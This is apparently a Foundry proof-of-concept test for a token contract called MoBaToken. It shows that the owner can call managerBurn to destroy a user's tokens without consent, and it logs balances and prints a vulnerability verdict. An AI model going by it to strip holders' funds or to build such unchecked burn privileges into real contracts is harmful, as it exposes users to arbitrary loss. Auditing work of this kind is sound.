// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MoBaToken.sol";

contract MoBaTokenTest is Test {
    address public constant USER = address(1);
    address public constant OWNER = address(2);
    
    MoBaToken token;
    
    function setUp() public {
        vm.prank(OWNER);
        token = new MoBaToken("TestToken", "TST");
    }

    function testManagerBurnPrivilegeEscalation() public {
        // Mint tokens to USER from contract owner
        vm.prank(OWNER);
        token.cross(USER, 1000 ether);  // Mint 1000 tokens to USER
        
        // Verify initial balance
        assertEq(token.balanceOf(USER), 1000 ether);

        // Pre-trigger state recording
        console.log("--- BEFORE-Trigger managerBurn ---");
        uint256 userBalanceBefore = token.balanceOf(USER);
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("USER balance:", userBalanceBefore);
        console.log("Total supply:", totalSupplyBefore);

        console.log("--- Trigger managerBurn ---");
        // Attack: Owner burns tokens from USER's account arbitrarily
        vm.prank(OWNER);
        token.managerBurn(USER, 100 ether);  // Burn 100 tokens

        // Post-trigger state recording
        console.log("--- AFTER-Trigger managerBurn ---");
        uint256 userBalanceAfter = token.balanceOf(USER);
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("USER balance:", userBalanceAfter);
        console.log("Total supply:", totalSupplyAfter);

        // State difference calculations
        uint256 userBalanceDiff = userBalanceBefore - userBalanceAfter;
        uint256 totalSupplyDiff = totalSupplyBefore - totalSupplyAfter;

        console.log("USER balance change: %s (expected: 100 ether)", userBalanceDiff);
        console.log("Total supply change: %s (expected: 100 ether)", totalSupplyDiff);

        // Verify tokens were burned without USER's consent
        assertEq(userBalanceAfter, 900 ether);

        // Vulnerability verdict based on state changes
        if (userBalanceDiff == 100 ether && totalSupplyDiff == 100 ether) {
            console.log("Vulnerability Exists: Owner can arbitrarily burn tokens from any account");
        } else {
            console.log("Vulnerability not Exist: ManagerBurn operation did not change balances as expected");
        }
    }
}